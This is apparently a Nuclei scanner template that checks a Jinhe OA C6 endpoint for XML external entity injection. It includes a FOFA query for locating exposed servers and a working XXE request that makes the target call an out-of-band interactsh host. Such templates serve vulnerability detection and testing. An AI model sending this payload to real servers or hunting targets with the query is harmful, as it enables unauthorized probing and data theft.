id: jinhe-oa-jhsoftwebaccept-xxe
info:
  name: "金和 OA Jhsoft.Web.Accept.aspx XXE 注入漏洞"
  author: 0dayPoc
  severity: high
  description: |-
    fofa: app="金和网络-金和OA"
          金和网络作为专业信息化服务商，提供组织协同OA系统开发平台及电子政务解决方案。金和OA C6版本中的Jhsoft.Web.Accept.aspx接口存在XML外部实体注入漏洞，攻击者可通过构造恶意XML请求实现敏感数据读取，包括数据库凭证及用户隐私信息。在特定权限条件下，该漏洞可能被链式利用实现服务器端恶意代码部署，最终导致系统控制权丧失。
  tags: 金和OA
http:
- raw:
  - |
    POST /c6/Jhsoft.Web.Accept/XmlHttp.aspx/ HTTP/1.1
    Host: {{Hostname}}
    Content-Type: application/x-www-form-urlencoded

    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE root [
    <!ENTITY % remote SYSTEM "http://{{interactsh-url}}">
    %remote;]>
    <root/>
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 200
  - type: word
    part: interactsh_protocol
    words:
    - "dns"
